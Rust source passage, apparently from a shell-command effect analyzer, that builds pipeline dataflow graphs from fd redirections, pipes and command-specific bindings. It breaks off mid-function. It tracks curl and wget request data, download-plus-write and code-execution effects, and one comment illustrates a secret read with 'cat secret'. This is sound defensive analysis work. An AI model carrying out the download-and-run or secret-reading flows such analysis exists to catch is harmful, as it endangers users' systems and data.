//! Dataflow-graph construction for shell pipelines: turns a sequence of
//! pipeline stages into stage occurrences with typed ports, cross-stage pipe
//! edges (computed after applying each stage's ordered fd redirections), and
//! the per-command effect↔port bindings.
//!
//! Everything here states mechanism, never a judgment: a pipe edge asserts only
//! that one position's output reaches another position's input; the command
//! bindings say which effect produces or consumes a port; a policy consumer
//! decides what that means. Command-specific stream behavior stays keyed by
//! name; interpreter inputs bind from the sink's source attribute.

use std::collections::HashMap;

use effinterp_proto::{
    AttrValue, Boundary, BoundaryReason, CausalAssurance, Effect, ExecutionNodeRef, Modality, Port,
    ProvenanceRef, ResourceExpr, ResourceIdentity, ResourcePattern,
};

use crate::builder::PlanBuilder;
use crate::models::{
    CurlFlowOutput, ModelBindingEnd, ModelCausalBinding, curl_flow_info, wget_flow_info,
};
use crate::resource_transfer::TransferBinding;
use crate::word::Word;
use effinterp_model_schema::EffectSelection;

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub(crate) struct FlowRef {
    pub stage: u32,
    pub port: Port,
}

#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord)]
pub(crate) struct FlowReason(pub String);

impl FlowReason {
    pub(crate) fn new(reason: impl Into<String>) -> Self {
        Self(reason.into())
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct Flow {
    pub assurance: effinterp_proto::CausalAssurance,
    pub from: FlowRef,
    pub to: FlowRef,
    pub reason: FlowReason,
    pub provenance: Vec<ProvenanceRef>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum BindEnd {
    Port(Port),
    Effect(u32),
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct PortBinding {
    pub assurance: effinterp_proto::CausalAssurance,
    pub from: BindEnd,
    pub to: BindEnd,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct FlowStage {
    pub execution: Option<ExecutionNodeRef>,
    pub effects: Vec<u32>,
    pub bindings: Vec<PortBinding>,
    pub provenance: Vec<ProvenanceRef>,
}

/// Buffered source-expression stages; provenance is allocated by the walker so
/// Python summary capture keeps its own source-span reference space.
#[derive(Default)]
pub(crate) struct StageWriter {
    stages: Vec<FlowStage>,
    edges: Vec<Flow>,
}

impl StageWriter {
    pub(crate) fn new_stage(
        &mut self,
        node: ProvenanceRef,
        before: usize,
        after: usize,
    ) -> Option<usize> {
        if after <= before {
            return None;
        }
        Some(self.value_stage(node, (before as u32..after as u32).collect()))
    }
    /// A stage whose value carries the bytes of `effects`.
    pub(crate) fn value_stage(&mut self, node: ProvenanceRef, effects: Vec<u32>) -> usize {
        let bindings = effects
            .iter()
            .map(|&e| PortBinding {
                assurance: effinterp_proto::CausalAssurance::Conservative,
                from: BindEnd::Effect(e),
                to: BindEnd::Port(Port::Value),
            })
            .collect();
        let id = self.stages.len();
        self.stages.push(FlowStage {
            execution: None,
            effects,
            bindings,
            provenance: vec![node],
        });
        id
    }
    /// Carry all constructor inputs through its returned value without adding an effect.
    pub(crate) fn join_values(&mut self, node: ProvenanceRef, producers: &[usize]) -> usize {
        let stage = self.stages.len();
        self.stages.push(FlowStage {
            execution: None,
            effects: Vec::new(),
            bindings: (0..producers.len())
                .map(|index| PortBinding {
                    assurance: effinterp_proto::CausalAssurance::Conservative,
                    from: BindEnd::Port(Port::Arg(index as u32)),
                    to: BindEnd::Port(Port::Value),
                })
                .collect(),
            provenance: vec![node],
        });
        for (index, &producer) in producers.iter().enumerate() {
            self.add_edge(producer, stage, index as u32);
        }
        stage
    }
    /// An output call writes these producers' values to `execution`'s stdout.
    pub(crate) fn print_to_stdout(
        &mut self,
        node: ProvenanceRef,
        execution: ExecutionNodeRef,
        producers: &[usize],
    ) {
        let stage = self.stages.len();
        self.stages.push(FlowStage {
            execution: Some(execution),
            effects: Vec::new(),
            bindings: Vec::new(),
            provenance: vec![node],
        });
        for &producer in producers {
            self.edges.push(Flow {
                assurance: effinterp_proto::CausalAssurance::Conservative,
                from: FlowRef {
                    stage: producer as u32,
                    port: Port::Value,
                },
                to: FlowRef {
                    stage: stage as u32,
                    port: Port::Stdout,
                },
                reason: FlowReason::new("data_flow"),
                provenance: Vec::new(),
            });
        }
    }
    pub(crate) fn add_edge(&mut self, producer: usize, consumer: usize, arg: u32) {
        if producer == consumer {
            return;
        }
        self.edges.push(Flow {
            assurance: effinterp_proto::CausalAssurance::Conservative,
            from: FlowRef {
                stage: producer as u32,
                port: Port::Value,
            },
            to: FlowRef {
                stage: consumer as u32,
                port: Port::Arg(arg),
            },
            reason: FlowReason::new("data_flow"),
            provenance: Vec::new(),
        });
        let effects = self.stages[consumer].effects.clone();
        for e in effects {
            let binding = PortBinding {
                assurance: effinterp_proto::CausalAssurance::Conservative,
                from: BindEnd::Port(Port::Arg(arg)),
                to: BindEnd::Effect(e),
            };
            if !self.stages[consumer].bindings.contains(&binding) {
                self.stages[consumer].bindings.push(binding);
            }
        }
    }
    /// Stages without any def-use edges stay omitted from the plan.
    pub(crate) fn commit(&mut self, builder: &mut PlanBuilder) {
        if self.edges.is_empty() {
            return;
        }
        let stages = std::mem::take(&mut self.stages);
        let mut remap: Vec<Option<u32>> = Vec::with_capacity(stages.len());
        for stage in stages {
            remap.push(builder.flow_stage(stage));
        }
        for mut edge in std::mem::take(&mut self.edges) {
            let (Some(from), Some(to)) = (
                remap[edge.from.stage as usize],
                remap[edge.to.stage as usize],
            ) else {
                continue;
            };
            edge.from.stage = from;
            edge.to.stage = to;
            builder.flow_edge(edge);
        }
    }
}

/// These effects send their bytes to the current execution's stdout.
pub(crate) fn effects_to_stdout(
    builder: &mut PlanBuilder,
    effects: Vec<u32>,
    assurance: CausalAssurance,
    provenance: Vec<ProvenanceRef>,
) {
    if effects.is_empty() {
        return;
    }
    let execution = builder.current_execution();
    builder.flow_stage(FlowStage {
        execution: Some(execution),
        bindings: effects
            .iter()
            .map(|&effect| PortBinding {
                assurance,
                from: BindEnd::Effect(effect),
                to: BindEnd::Port(Port::Stdout),
            })
            .collect(),
        effects,
        provenance,
    });
}

/// One command stage handed to the flow builder. Effect ranges are captured
/// around the stage's analysis; shell stages also carry source provenance.
pub(crate) struct StageSpec {
    pub name: Option<String>,
    pub words: Vec<Word>,
    /// Pending value producers carried by each argv word.
    pub argument_producers: Vec<Vec<FlowRef>>,
    /// Whether the corresponding argv word is a lone unquoted command
    /// substitution whose resource selection may span several fields.
    pub unquoted_substitutions: Vec<bool>,
    pub execution: Option<ExecutionNodeRef>,
    pub stdin_value: bool,
    pub effect_start: u32,
    pub effect_end: u32,
    pub redirs: Vec<Redirection>,
    pub inherited_redirs: Vec<Redirection>,
    /// Shell-resolved descriptor paths, paired with the descriptor in this stage.
    pub descriptor_operands: Vec<(ResourceExpr, Descriptor)>,
    pub span_node: Option<ProvenanceRef>,
    pub model_bindings: Vec<ModelCausalBinding>,
    /// The resource selection the command prints, as its model declares it
    /// for a substitution that captures stdout.
    pub stdout_selections: Vec<ModelCausalBinding>,
}

/// Allocated descriptors have an identity, but no statically known OS number.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, PartialOrd, Ord)]
pub(crate) enum Descriptor {
    Number(u32),
    Allocated(ProvenanceRef),
}

/// A stage redirection retains its resource effects while descriptors are
/// copied or replaced. Shell parsing and runtime fd numbers stay separate.
#[derive(Clone)]
pub(crate) struct Redirection {
    pub role: RedirRole,
    pub fd: Descriptor,
    pub dup: Option<DupTarget>,
    pub both: bool,
    pub read_effect: Option<u32>,
    pub write_effect: Option<u32>,
}

#[derive(Clone)]
pub(crate) enum RedirRole {
    /// Restore the owning execution's stream after replaying inherited copies.
    Inherited(Descriptor),
    /// A shell-created channel, keyed by its pending stream stage.
    Channel {
        stage: u32,
        read: bool,
        write: bool,
    },
    In,
    Out,
    Append,
    ReadWrite,
    Dup,
}

#[derive(Clone)]
pub(crate) enum DupTarget {
    Fd(Descriptor),
    Move(Descriptor),
    Close,
}

/// Where a file descriptor points after redirections are applied.
#[derive(Clone, Copy, PartialEq)]
enum Dest {
    /// Writes into the pipe to the next stage.
    PipeNext,
    /// Reads from the pipe from the previous stage.
    PipePrev,
    /// Inherited terminal / parent descriptor.
    External(Descriptor),
    Closed,
    Channel {
        stage: u32,
        read: bool,
        write: bool,
    },
    /// A file or socket, retaining its effects through descriptor copies.
    File {
        read_effect: Option<u32>,
        write_effect: Option<u32>,
    },
}

/// Build the flow graph for one multi-stage pipeline and record it on the
/// builder. Stages are registered in position order; pipe edges are emitted
/// only after each stage's ordered redirections are applied.
pub(crate) fn build_pipeline(builder: &mut PlanBuilder, stages: Vec<StageSpec>) {
    let n = stages.len();
    // Argument producers use pending stage ids. Defer the pipeline stages too
    // so producer and pipe edges share that id space and materialize together.
    // Keep every deferred pipeline stage: commit_pending_flows would otherwise
    // drop a sibling that no pipe edge names, taking its effect↔port bindings.
    let has_pending_flows = stages.iter().any(|spec| {
        echo_printf_writes_stdout(spec)
            && spec
                .argument_producers
                .iter()
                .skip(1)
                .any(|producers| !producers.is_empty())
            || spec
                .argument_producers
                .iter()
                .zip(&spec.unquoted_substitutions)
                .any(|(producers, unquoted)| *unquoted && !producers.is_empty())
    });
    let has_pending_flows = has_pending_flows
        || stages.iter().any(|spec| {
            spec.redirs
                .iter()
                .chain(&spec.inherited_redirs)
                .any(|redir| matches!(redir.role, RedirRole::Channel { .. }))
        });
    let fd_tables: Vec<HashMap<Descriptor, Dest>> = stages
        .iter()
        .enumerate()
        .map(|(i, s)| fd_table(i, n, &s.inherited_redirs, &s.redirs))
        .collect();

    for spec in &stages {
        for (argument, (producers, unquoted)) in spec
            .argument_producers
            .iter()
            .zip(&spec.unquoted_substitutions)
            .enumerate()
        {
            if *unquoted {
                builder.apply_exact_argument_selection(
                    producers,
                    spec.effect_start..spec.effect_end,
                    argument as u32,
                );
            }
        }
    }

    // Register each stage occurrence, with its effect↔port bindings.
    let mut stage_ids: Vec<Option<u32>> = Vec::with_capacity(n);
    for (index, spec) in stages.iter().enumerate() {
        if let Some(execution) = spec.execution {
            // Which inherited output stream each of fd 1 and fd 2 still
            // reaches after this stage's redirections: `>&2` sends stdout
            // where stderr went, and a file or a closed descriptor cuts it.
            // A pipe is wired onto the stream below.
            let output = |number: u32| match fd_tables[index].get(&Descriptor::Number(number)) {
                Some(Dest::PipeNext) => Some(number),
                Some(Dest::External(Descriptor::Number(source @ (1 | 2)))) => Some(*source),
                _ => None,
            };
            builder.route_execution_outputs(execution, output(1), output(2));
        }
        classify_stdin(
            builder,
            spec,
            matches!(
                fd_tables[index].get(&Descriptor::Number(0)),
                Some(Dest::External(_))
            ),
        );
        classify_stdin_program_input(builder, spec, &fd_tables[index]);
        let effects: Vec<u32> = (spec.effect_start..spec.effect_end).collect();
        let mut bindings = command_bindings(builder, spec);
        bindings.extend(redirect_bindings(&fd_tables[index]));
        for (argument, (producers, unquoted)) in spec
            .argument_producers
            .iter()
            .zip(&spec.unquoted_substitutions)
            .enumerate()
        {
            if !*unquoted || producers.is_empty() {
                continue;
            }
            bindings.extend(
                (spec.effect_start..spec.effect_end)
                    .filter(|effect| builder.effect_has_argument(*effect as usize, argument as u32))
                    .map(|effect| {
                        binding(
                            BindEnd::Port(Port::Arg(argument as u32)),
                            BindEnd::Effect(effect),
                            CausalAssurance::Conservative,
                        )
                    }),
            );
        }
        for (resource, descriptor) in &spec.descriptor_operands {
            let Some(Dest::File {
                read_effect,
                write_effect,
            }) = fd_tables[index].get(descriptor)
            else {
                continue;
            };
            for effect in spec.effect_start..spec.effect_end {
                if builder.effect_execution(effect as usize) != spec.execution
                    || builder.effect_resource(effect as usize) != Some(resource)
                {
                    continue;
                }
                let pair = match builder.effect_operation(effect as usize) {
                    Some("filesystem.read") => read_effect.map(|source| (source, effect)),
                    Some("filesystem.write") => write_effect.map(|sink| (effect, sink)),
                    _ => None,
                };
                if let Some((source, sink)) = pair {
                    bindings.push(binding(
                        BindEnd::Effect(source),
                        BindEnd::Effect(sink),
                        CausalAssurance::Exact,
                    ));
                }
            }
        }
        bindings.extend(spawn_stdout_bindings(builder, spec, &fd_tables[index]));
        let stage = FlowStage {
            execution: spec.execution,
            effects,
            bindings,
            provenance: spec.span_node.into_iter().collect(),
        };
        stage_ids.push(if has_pending_flows {
            let pending = builder.pending_flow_stage(stage) as u32;
            builder.keep_pending_flow_stage(pending);
            Some(pending)
        } else {
            builder.flow_stage(stage)
        });
    }

    for (index, table) in fd_tables.iter().enumerate() {
        let spec = &stages[index];
        for (resource, descriptor) in &spec.descriptor_operands {
            let Some(Dest::Channel {
                stage: channel,
                read,
                write,
            }) = table.get(descriptor)
            else {
                continue;
            };
            for effect in spec.effect_start..spec.effect_end {
                if builder.effect_execution(effect as usize) != spec.execution
                    || builder.effect_resource(effect as usize) != Some(resource)
                {
                    continue;
                }
                let input = match builder.effect_operation(effect as usize) {
                    Some("filesystem.read") if *read => true,
                    Some("filesystem.write") if *write => false,
                    _ => continue,
                };
                let value = BindEnd::Port(Port::Value);
                let effect_end = BindEnd::Effect(effect);
                let (from, to) = if input {
                    (value, effect_end)
                } else {
                    (effect_end, value)
                };
                let operand = builder.pending_flow_stage(FlowStage {
                    execution: spec.execution,
                    effects: vec![effect],
                    bindings: vec![binding(from, to, CausalAssurance::Exact)],
                    provenance: spec.span_node.into_iter().collect(),
                }) as u32;
                let value = FlowRef {
                    stage: operand,
                    port: Port::Value,
                };
                let channel = FlowRef {
                    stage: *channel,
                    port: if input { Port::Stdout } else { Port::Stdin },
                };
                let (from, to) = if input {
                    (channel, value)
                } else {
                    (value, channel)
                };
                builder.pending_flow_edge(Flow {
                    assurance: CausalAssurance::Exact,
                    from,
                    to,
                    reason: FlowReason::new("descriptor operand"),
                    provenance: spec.span_node.into_iter().collect(),
                });
            }
        }
        let Some(stage) = stage_ids[index] else {
            continue;
        };
        for (number, port) in [(0, Port::Stdin), (1, Port::Stdout), (2, Port::Stderr)] {
            let Some(Dest::Channel {
                stage: channel,
                read,
                write,
            }) = table.get(&Descriptor::Number(number))
            else {
                continue;
            };
            if number == 0 && !read || number != 0 && !write {
                continue;
            }
            let local = FlowRef { stage, port };
            let remote = FlowRef {
                stage: *channel,
                port: if number == 0 {
                    Port::Stdout
                } else {
                    Port::Stdin
                },
            };
            let (from, to) = if number == 0 {
                (remote, local)
            } else {
                (local, remote)
            };
            builder.pending_flow_edge(Flow {
                assurance: CausalAssurance::Exact,
                from,
                to,
                reason: FlowReason::new("descriptor channel"),
                provenance: stages[index].span_node.into_iter().collect(),
            });
        }
    }

    if has_pending_flows {
        for (spec, stage) in stages.iter().zip(&stage_ids) {
            let Some(stage) = stage else {
                continue;
            };
            for (argument, (producers, unquoted)) in spec
                .argument_producers
                .iter()
                .zip(&spec.unquoted_substitutions)
                .enumerate()
            {
                if !*unquoted {
                    continue;
                }
                for producer in producers {
                    builder.pending_flow_edge(Flow {
                        assurance: CausalAssurance::Conservative,
                        from: producer.clone(),
                        to: FlowRef {
                            stage: *stage,
                            port: Port::Arg(argument as u32),
                        },
                        reason: FlowReason::new("command substitution fields"),
                        provenance: Vec::new(),
                    });
                }
            }
        }
        for (spec, stage) in stages.iter().zip(&stage_ids) {
            if !echo_printf_writes_stdout(spec) {
                continue;
            }
            let Some(stage) = stage else {
                continue;
            };
            for producer in spec.argument_producers.iter().skip(1).flatten() {
                builder.pending_flow_edge(Flow {
                    assurance: effinterp_proto::CausalAssurance::Conservative,
                    from: producer.clone(),
                    to: FlowRef {
                        stage: *stage,
                        port: Port::Stdout,
                    },
                    reason: FlowReason::new("data_flow"),
                    provenance: Vec::new(),
                });
            }
        }
    }

    // Builtin listings have private stage ports for redirection, but their
    // unredirected output still belongs to the enclosing shell execution.
    for (index, spec) in stages.iter().enumerate() {
        if spec.execution.is_some()
            || fd_tables[index].get(&Descriptor::Number(1))
                != Some(&Dest::External(Descriptor::Number(1)))
            || !environment_stdout_stage(builder, spec)
        {
            continue;
        }
        let Some(from) = stage_ids[index] else {
            continue;
        };
        let owner = FlowStage {
            execution: Some(builder.current_execution()),
            effects: Vec::new(),
            bindings: Vec::new(),
            provenance: spec.span_node.into_iter().collect(),
        };
        let owner = if has_pending_flows {
            Some(builder.pending_flow_stage(owner) as u32)
        } else {
            builder.flow_stage(owner)
        };
        let Some(to) = owner else { continue };
        let edge = Flow {
            assurance: effinterp_proto::CausalAssurance::Conservative,
            from: FlowRef {
                stage: from,
                port: Port::Stdout,
            },
            to: FlowRef {
                stage: to,
                port: Port::Stdout,
            },
            reason: FlowReason::new("shell stdout"),
            provenance: spec.span_node.into_iter().collect(),
        };
        if has_pending_flows {
            builder.pending_flow_edge(edge);
        } else {
            builder.flow_edge(edge);
        }
    }

    // Pipe edges: for each adjacent pair, whichever of the writer's fds still
    // point at the pipe reach the reader's stdin — unless the reader redirected
    // its stdin away.
    for i in 0..n.saturating_sub(1) {
        let (Some(from_stage), Some(to_stage)) = (stage_ids[i], stage_ids[i + 1]) else {
            continue;
        };
        let reader_reads_pipe =
            fd_tables[i + 1].get(&Descriptor::Number(0)) == Some(&Dest::PipePrev);
        if !reader_reads_pipe {
            continue;
        }
        for (fd, port) in [(1u32, Port::Stdout), (2u32, Port::Stderr)] {
            if fd_tables[i].get(&Descriptor::Number(fd)) == Some(&Dest::PipeNext) {
                if let (Some(from), Some(to)) = (stages[i].execution, stages[i + 1].execution) {
                    let stream = if fd == 1 {
                        effinterp_proto::ExecutionStream::Stdout
                    } else {
                        effinterp_proto::ExecutionStream::Stderr
                    };
                    builder.execution_pipe(from, stream, to);
                }
                let edge = Flow {
                    assurance: CausalAssurance::Exact,
                    from: FlowRef {
                        stage: from_stage,
                        port,
                    },
                    to: FlowRef {
                        stage: to_stage,
                        port: Port::Stdin,
                    },
                    reason: FlowReason::new("pipe"),
                    provenance: Vec::new(),
                };
                if has_pending_flows {
                    builder.pending_flow_edge(edge);
                } else {
                    builder.flow_edge(edge);
                }
            }
        }
    }
}

/// Settle the operands xargs fills from stdin in each shell stage that does
/// not read the enclosing shell's stdin. An exact resource selection the
/// writer prints to the pipe reaches them, as an unquoted `$(…)` would; a
/// pipe, file or inline input of an inner command means an enclosing
/// pipeline's selection never does.
pub(crate) fn settle_stdin_arguments(builder: &mut PlanBuilder, stages: &[StageSpec]) {
    let n = stages.len();
    for (i, stage) in stages.iter().enumerate() {
        let table = fd_table(i, n, &stage.inherited_redirs, &stage.redirs);
        let stdin = table.get(&Descriptor::Number(0));
        if stdin == Some(&Dest::External(Descriptor::Number(0))) && !stage.stdin_value {
            continue;
        }
        // A channel's writer runs as a deferred process, analyzed after
        // this stage; its selection settles the operands then.
        if let Some(Dest::Channel {
            stage: channel,
            read: true,
            ..
        }) = stdin
            && !stage.stdin_value
        {
            builder.defer_channel_arguments(*channel, stage.effect_start..stage.effect_end);
            continue;
        }
        let writer = &stages[i.saturating_sub(1)];
        let source = (stdin == Some(&Dest::PipePrev)
            && fd_table(i - 1, n, &writer.inherited_redirs, &writer.redirs)
                .get(&Descriptor::Number(1))
                == Some(&Dest::PipeNext))
        .then(|| stdout_selection(builder, writer))
        .flatten();
        builder.settle_stdin_arguments(source, stage.effect_start..stage.effect_end);
    }
}

/// The one effect whose resource selection `writer` prints exactly on stdout.
fn stdout_selection(builder: &PlanBuilder, writer: &StageSpec) -> Option<u32> {
    let mut sources = declarative_bindings(
        builder,
        writer.effect_start,
        writer.effect_end,
        &writer.stdout_selections,
    )
    .into_iter()
    .filter_map(
        |binding| match (binding.assurance, binding.from, binding.to) {
            (CausalAssurance::Exact, BindEnd::Effect(effect), BindEnd::Port(Port::Stdout)) => {
                Some(effect)
            }
            _ => None,
        },
    )
    .collect::<std::collections::BTreeSet<_>>()
    .into_iter();
    match (sources.next(), sources.next()) {
        (Some(source), None) => Some(source),
        _ => None,
    }
}

/// Every channel a stage of this pipeline can write, each with the exact
/// selection that stage prints there: only a stdout carries one. `captured`
/// is the channel this shell's own stdout feeds, when a deferred process's
/// output is that channel.
pub(crate) fn channel_writers(
    builder: &PlanBuilder,
    stages: &[StageSpec],
    captured: Option<u32>,
) -> Vec<(u32, Option<u32>)> {
    let n = stages.len();
    let mut writers = Vec::new();
    for (i, stage) in stages.iter().enumerate() {
        for (descriptor, dest) in fd_table(i, n, &stage.inherited_redirs, &stage.redirs) {
            let channel = match dest {
                Dest::Channel {
                    stage, write: true, ..
                } => stage,
                Dest::External(Descriptor::Number(1)) => match captured {
                    Some(channel) => channel,
                    None => continue,
                },
                _ => continue,
            };
            let source = (descriptor == Descriptor::Number(1))
                .then(|| stdout_selection(builder, stage))
                .flatten();
            writers.push((channel, source));
        }
    }
    writers
}

/// Single commands need a stage only when their internal data path matters.
pub(crate) fn needs_single_stage(builder: &PlanBuilder, spec: &StageSpec) -> bool {
    let has = |operation| {
        (spec.effect_start..spec.effect_end).any(|index| {
            stage_effect(builder, spec, index)
                && builder.effect_operation(index as usize) == Some(operation)
        })
    };
    let request_values = match spec.name.as_deref() {
        Some("curl") => {
            let info = curl_flow_info(&spec.words);
            !info.body_read_arguments.is_empty() || !info.header_arguments.is_empty()
        }
        Some("wget") => {
            let info = wget_flow_info(&spec.words);
            !info.body_read_arguments.is_empty() || !info.header_arguments.is_empty()
        }
        _ => false,
    };
    let redirected_echo_printf_producer = !spec.redirs.is_empty()
        && echo_printf_writes_stdout(spec)
        && spec
            .argument_producers
            .iter()
            .skip(1)
            .any(|producers| !producers.is_empty());
    environment_stdout_stage(builder, spec)
        || spec
            .argument_producers
            .iter()
            .zip(&spec.unquoted_substitutions)
            .any(|(producers, unquoted)| *unquoted && !producers.is_empty())
        || spec
            .redirs
            .iter()
            .chain(&spec.inherited_redirs)
            .any(|redir| {
                redir.read_effect.is_some()
                    || redir.write_effect.is_some()
                    || matches!(redir.role, RedirRole::Channel { .. })
            })
        || spec.stdin_value
        || request_values
        || redirected_echo_printf_producer
        || !command_bindings(builder, spec).is_empty()
        || has("process.code_execution")
        || has("network.download") && has("filesystem.write")
}

/// Register the internal bindings of a root exec without reclassifying its
/// declared stdin source as an interactive shell stage. `provenance` is the
/// scope this invocation came from, so the stage's stream occurrences stay
/// explained on a causal path through them.
pub(crate) fn build_root_exec_stage(
    builder: &mut PlanBuilder,
    spec: StageSpec,
    provenance: Vec<ProvenanceRef>,
) {
    let bindings = command_bindings(builder, &spec);
    builder.flow_stage(FlowStage {
        execution: spec.execution,
        effects: (spec.effect_start..spec.effect_end).collect(),
        bindings,
        provenance,
    });
}

fn stage_effect(builder: &PlanBuilder, spec: &StageSpec, index: u32) -> bool {
    let (Some(root), Some(candidate)) = (spec.execution, builder.effect_execution(index as usize))
    else {
        return false;
    };
    builder.execution_is_within(root, candidate)
}

/// Resolve each fd's destination after applying redirections left to right.
fn fd_table(
    i: usize,
    n: usize,
    inherited_redirs: &[Redirection],
    redirs: &[Redirection],
) -> HashMap<Descriptor, Dest> {
    let mut fd = HashMap::from([
        (Descriptor::Number(0), Dest::External(Descriptor::Number(0))),
        (Descriptor::Number(1), Dest::External(Descriptor::Number(1))),
        (Descriptor::Number(2), Dest::External(Descriptor::Number(2))),
    ]);
    apply_fd_redirections(&mut fd, inherited_redirs);
    // Pipeline descriptors replace the shell's inherited descriptors before
    // command-local redirections are applied.
    if i > 0 {
        fd.insert(Descriptor::Number(0), Dest::PipePrev);
    }
    if i + 1 < n {
        fd.insert(Descriptor::Number(1), Dest::PipeNext);
    }
    apply_fd_redirections(&mut fd, redirs);
    fd
}

pub(crate) fn descriptor_open(
    inherited: &[Redirection],
    local: &[Redirection],
    descriptor: Descriptor,
) -> bool {
    matches!(fd_table(0, 1, inherited, local).get(&descriptor), Some(destination) if *destination != Dest::Closed)
}

/// The standard stream a descriptor copies when the command's own
/// redirections made it a duplicate of another of its standard streams
/// (`2<&0`). A copy an earlier `exec` made duplicates the shell's stream,
/// which a pipeline later replaces, so only command-local copies count.
pub(crate) fn descriptor_stream(local: &[Redirection], descriptor: Descriptor) -> Option<u32> {
    match fd_table(0, 1, &[], local).get(&descriptor) {
        Some(Dest::External(Descriptor::Number(stream)))
            if *stream <= 2 && descriptor != Descriptor::Number(*stream) =>
        {
            Some(*stream)
        }
        _ => None,
    }
}

pub(crate) fn descriptor_channel(
    inherited: &[Redirection],
    local: &[Redirection],
    descriptor: Descriptor,
) -> Option<u32> {
    match fd_table(0, 1, inherited, local).get(&descriptor) {
        Some(Dest::Channel {
            stage, write: true, ..
        }) => Some(*stage),
        _ => None,
    }
}

pub(crate) fn restore_descriptors(
    inherited: &[Redirection],
    local: &[Redirection],
) -> Vec<Redirection> {
    let table = fd_table(0, 1, inherited, &[]);
    let mut descriptors: Vec<_> = local
        .iter()
        .flat_map(|redir| {
            if redir.both {
                vec![Descriptor::Number(1), Descriptor::Number(2)]
            } else {
                vec![redir.fd]
            }
        })
        .collect();
    descriptors.sort_unstable();
    descriptors.dedup();
    descriptors
        .into_iter()
        .map(|fd| {
            let mut redir = Redirection {
                role: RedirRole::Dup,
                fd,
                dup: Some(DupTarget::Close),
                both: false,
                read_effect: None,
                write_effect: None,
            };
            match table.get(&fd) {
                Some(Dest::File {
                    read_effect,
                    write_effect,
                }) => {
                    redir.role = RedirRole::ReadWrite;
                    redir.read_effect = *read_effect;
                    redir.write_effect = *write_effect;
                }
                Some(Dest::External(source)) => redir.role = RedirRole::Inherited(*source),
                Some(Dest::Channel { stage, read, write }) => {
                    redir.role = RedirRole::Channel {
                        stage: *stage,
                        read: *read,
                        write: *write,
                    }
                }
                _ => {}
            }
            redir
        })
        .collect()
}

fn apply_fd_redirections(fd: &mut HashMap<Descriptor, Dest>, redirs: &[Redirection]) {
    for r in redirs {
        let file = Dest::File {
            read_effect: r.read_effect,
            write_effect: r.write_effect,
        };
        match r.role {
            RedirRole::Inherited(source) => {
                fd.insert(r.fd, Dest::External(source));
            }
            RedirRole::Channel { stage, read, write } => {
                fd.insert(r.fd, Dest::Channel { stage, read, write });
            }
            RedirRole::In | RedirRole::ReadWrite => {
                fd.insert(r.fd, file);
            }
            RedirRole::Out | RedirRole::Append => {
                if r.both {
                    fd.insert(Descriptor::Number(1), file);
                    fd.insert(Descriptor::Number(2), file);
                } else {
                    fd.insert(r.fd, file);
                }
            }
            RedirRole::Dup => {
                let target = match &r.dup {
                    Some(DupTarget::Fd(m) | DupTarget::Move(m)) => {
                        fd.get(m).copied().unwrap_or(Dest::External(*m))
                    }
                    Some(DupTarget::Close) | None => Dest::Closed,
                };
                fd.insert(
                    r.fd,
                    if r.read_effect.is_some() || r.write_effect.is_some() {
                        file
                    } else {
                        target
                    },
                );
                if let Some(DupTarget::Move(source)) = r.dup {
                    fd.insert(source, Dest::Closed);
                }
            }
        }
    }
}

/// A spawned command owns its own stdout: whatever the program writes there
/// is produced by that execution. The binding is added only where the stage's
/// stdout still reaches a consumer, so a command whose output nothing reads
/// gains no port, and a stage with no stdout-producing model still keeps a
/// pipeline connected through it.
///
/// A recovered value that reaches the command's argv already ends at its
/// spawn. Naming that same occurrence as the origin of stdout would turn the
/// argv edge into a path from the command's inputs to its output, which a
/// wrapper such as `env A=$(cat secret) printenv B` does not have, so a stage
/// carrying a recovered argument claims no origin.
fn spawn_stdout_bindings(
    builder: &PlanBuilder,
    spec: &StageSpec,
    fd: &HashMap<Descriptor, Dest>,
) -> Vec<PortBinding> {
    if !matches!(
        fd.get(&Descriptor::Number(1)),
        Some(
            Dest::PipeNext
                | Dest::File {
                    write_effect: Some(_),
                    ..
                }
        )
    ) || spec
        .argument_producers
        .iter()
        .any(|producers| !producers.is_empty())
    {
        return Vec::new();
    }
    (spec.effect_start..spec.effect_end)
        .filter(|index| {
            execution_effect(builder, spec.execution, *index)
                && builder.effect_operation(*index as usize) == Some("process.exec")
        })
        .map(|spawn| {
            binding(
                BindEnd::Effect(spawn),
                BindEnd::Port(Port::Stdout),
                CausalAssurance::Conservative,
            )
        })
        .collect()
}

/// Intra-stage bindings for resource redirections: a read on stdin feeds the
/// stage's stdin; a write on stdout/stderr is fed by that port.
fn redirect_bindings(fd: &HashMap<Descriptor, Dest>) -> Vec<PortBinding> {
    let mut b = Vec::new();
    if let Some(Dest::File {
        read_effect: Some(effect),
        ..
    }) = fd.get(&Descriptor::Number(0))
    {
        b.push(binding(
            BindEnd::Effect(*effect),
            BindEnd::Port(Port::Stdin),
            CausalAssurance::Exact,
        ));
    }
    // The final destination includes persistent redirects, pipeline overrides,
    // and command-local descriptor copies. Only surviving writes consume output.
    for (descriptor, port) in [(1, Port::Stdout), (2, Port::Stderr)] {
        if let Some(Dest::File {
            write_effect: Some(effect),
            ..
        }) = fd.get(&Descriptor::Number(descriptor))
        {
            b.push(binding(
                BindEnd::Port(port),
                BindEnd::Effect(*effect),
                CausalAssurance::Exact,
            ));
        }
    }
    b
}

fn binding(from: BindEnd, to: BindEnd, assurance: CausalAssurance) -> PortBinding {
    PortBinding {
        assurance,
        from,
        to,
    }
}

fn pass(from: Port, to: Port, assurance: CausalAssurance) -> PortBinding {
    PortBinding {
        assurance,
        from: BindEnd::Port(from),
        to: BindEnd::Port(to),
    }
}

/// Command-specific and effect-shaped bindings for one stage.
fn command_bindings(builder: &PlanBuilder, spec: &StageSpec) -> Vec<PortBinding> {
    let mut b = command_bindings_for_stage(builder, spec);
    for binding in &mut b {
        let foreign_effect = [&binding.from, &binding.to].iter().any(|end| {
            matches!(end, BindEnd::Effect(index)
                if !execution_effect(builder, spec.execution, *index))
        });
        // The model certifies how its selected inputs reach its outputs. A
        // symbolic resource or argument does not invalidate that certificate;
        // selection uncertainty remains on the resource and execution reach
        // remains in modality and conditions. The certificate applies only to
        // this exact execution, never to nested effects in its range.
        if foreign_effect
            || !spec
                .execution
                .is_some_and(|execution| builder.execution_is_exact(execution))
        {
